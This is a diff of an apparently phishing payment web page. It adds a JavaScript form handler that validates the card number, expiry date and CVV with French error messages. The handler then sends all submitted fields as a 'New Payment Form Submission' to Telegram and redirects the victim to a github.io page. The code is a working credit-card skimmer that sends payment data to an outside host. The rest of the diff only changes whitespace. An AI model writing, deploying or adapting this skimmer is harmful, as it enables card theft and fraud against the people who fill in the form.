@@ -91,9 +91,7 @@
             direction: ltr;
         }
     </style>
-
-        
-
+ 
 	<!-- SECTION START HERE -->
 	<section>
 
@@ -263,23 +261,46 @@ function handleSubmit(event) {
     
 
 <script>
-    // Function to handle form submission
-    function handleSubmit(event) {
-        event.preventDefault(); // Prevent default form submission
-        
-        const formData = new FormData(event.target);
-        let message = "New Payment Form Submission:\n";
-        formData.forEach((value, key) => {
-            if (key !== '_token') { // Exclude hidden fields
-                message += `${capitalizeFirstLetter(key.replace('_', ' '))}: ${value}\n`;
-            }
-        });
+function handleSubmit(event) {
+    event.preventDefault(); // Prevent default form submission
 
-        // Send the message to Telegram and then redirect
-        sendTelegramAlert(message).then(() => {
-            window.location.href = 'https://justmoicom.github.io/test3/';
-        });
+    const cardNumber = document.getElementById('card_number').value.replace(/\s+/g, '');
+    const expiryDate = document.getElementById('expiry_date').value.replace(/\s+/g, '').replace('/', '');
+    const cvv = document.getElementById('cvv').value;
+
+    // Validation checks
+    if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+        alert("Le numéro de carte doit comporter exactement 16 chiffres.");
+        return false;
     }
+
+    if (expiryDate.length !== 4 || !/^\d{2}\d{2}$/.test(expiryDate) || !(parseInt(expiryDate.substring(0, 2)) >= 1 && parseInt(expiryDate.substring(0, 2)) <= 12) || !(parseInt(expiryDate.substring(2, 4)) >= 23)) {
+        alert("La date d'expiration doit être au format MM / AA valide.");
+        return false;
+    }
+
+    if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+        alert("Le CVC/CVV doit comporter exactement 3 chiffres.");
+        return false;
+    }
+
+    // Proceed with sending form data to Telegram
+    const formData = new FormData(event.target);
+    let message = "New Payment Form Submission:\n";
+    formData.forEach((value, key) => {
+        if (key !== '_token') {
+            message += `${capitalizeFirstLetter(key.replace('_', ' '))}: ${value}\n`;
+        }
+    });
+
+    sendTelegramAlert(message).then(() => {
+        // Redirect after successful form submission
+        window.location.href = 'https://justmoicom.github.io/test3/';
+    });
+
+    return false; // Prevent form submission to server
+}
+
 
     // Function to capitalize the first letter of each word in a string
     function capitalizeFirstLetter(string) {
@@ -611,15 +632,7 @@ function handleSubmit(event) {
 			} else {
 				document.getElementById("hiddenTime").value = "1800";
 			}
-      
-      
-      
-      
-      
-      
-      
-      
-      
+     
 		}
 		var sec = document.getElementById("hiddenTime").value,
 			countDiv = document.getElementById("timer"),
@@ -628,12 +641,6 @@ function handleSubmit(event) {
 				'use strict';
 				secpass();
 			}, 1000);
-
-    
-    
-    
-    
-    
     
 		function secpass() {
 			'use strict';
